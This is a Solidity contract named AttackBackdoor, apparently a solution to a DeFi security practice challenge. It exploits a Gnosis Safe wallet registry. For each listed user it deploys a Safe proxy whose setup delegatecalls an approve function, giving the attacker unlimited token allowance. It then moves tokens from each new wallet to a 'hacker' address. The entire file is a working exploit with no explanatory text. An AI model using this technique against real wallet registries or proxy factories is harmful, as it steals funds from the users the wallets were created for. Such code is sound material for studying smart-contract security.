//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

interface ProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract AttackBackdoor {
    address public immutable masterCopy;
    address public walletRegistryAddress;
    ProxyFactory proxyFactory;

    constructor(
        address masterCopyAddress,
        address walletRegAddress,
        address proxyFactoryAddress
    ) {

        masterCopy = masterCopyAddress;
        walletRegistryAddress = walletRegAddress;
        proxyFactory = ProxyFactory(proxyFactoryAddress);
    }

    function approve(address spender, address token) external{
        IERC20(token).approve(spender,type(uint256).max);

    }

    function attack(address tokenAddress,address hacker, address[] calldata users) external{
        for(uint256 i=0; i<users.length; i++){
            address user = users[i];
            address[] memory owners = new address[](1);
            owners[0] = user;

            bytes memory encodedApprove = abi.encodeWithSignature("approve(address,address)", address(this), tokenAddress); 

    //         setup(
    //     address[] calldata _owners,
    //     uint256 _threshold,
    //     address to,
    //     bytes calldata data,
    //     address fallbackHandler,
    //     address paymentToken,
    //     uint256 payment,
    //     address payable paymentReceiver
    // )

            bytes memory encodedSetup = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", 
            owners,
            1,
            address(this),
            encodedApprove,
            address(0),
            0,
            0,
            0);

            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(masterCopy,encodedSetup,0,IProxyCreationCallback(walletRegistryAddress));

            IERC20(tokenAddress).transferFrom(address(proxy), hacker, 10 ether);
        }
    }
}
